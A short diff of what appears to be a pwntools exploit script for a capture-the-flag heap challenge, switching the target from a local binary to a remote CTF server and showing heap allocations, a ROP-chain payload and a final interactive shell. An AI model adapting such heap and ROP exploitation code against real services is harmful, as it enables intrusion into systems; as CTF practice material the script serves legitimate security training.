@@ -22,7 +22,7 @@ def show_(index):
 def exit_():
     p.sendlineafter(b'> ', b'5')
 
-p = process('./chall')
+p = remote('chal1.fwectf.com', 8010)
 
 allocate_(0, 0x418, b'A'*0x418)
 allocate_(1, 0x18, b'B'*0x18)
@@ -73,5 +73,6 @@ rop = flat(
 payload  = p64(0xdeadbeef)
 payload += rop
 allocate_(1, 0x108, payload)
+
 
 p.interactive()
